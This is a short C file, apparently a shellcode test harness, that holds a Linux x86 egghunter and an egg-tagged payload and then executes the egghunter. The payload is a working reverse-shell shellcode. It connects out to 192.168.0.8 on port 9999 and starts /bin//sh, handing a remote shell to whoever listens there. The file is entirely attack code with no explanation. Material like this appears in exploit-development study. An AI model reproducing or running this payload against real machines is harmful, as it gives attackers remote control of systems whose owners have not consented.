#include<stdio.h>
#include<string.h>

#define egg "\x74\x30\x30\x77" // Egg - 'w00t' in reverse (little-endian)

// Egghunter shellcode
unsigned char egghunter[] = "\x66\x81\xc9\xff\x0f\x41\x75\x01\x41\x6a\x43\x58\xcd\x80\x3c\xf2\x74\xee\xb8\x74\x30\x30\x77\x89\xcf\xaf\x75\xe9\xaf\x75\xe6\xff\xe7";

// reverse shell shellcode
unsigned char shellcode[] = egg egg "\x6a\x66\x58\x31\xdb\x43\x31\xd2\x52\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc7\x6a\x66\x58\x68\xc0\xa8\x00\x08\x66\x68\x27\x0f\x43\x66\x53\x89\xe1\x6a\x10\x51\x57\x89\xe1\x43\xcd\x80\x89\xfb\x31\xc9\x6a\x3f\x58\xcd\x80\x41\x80\xf9\x02\x7e\xf5\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x89\xe2\x53\x89\xe1\xcd\x80"; 

main()
{
	printf("Shellcode Length: %d\n", strlen(shellcode));
    int (*ret)() = (int(*)())egghunter;
    ret();
}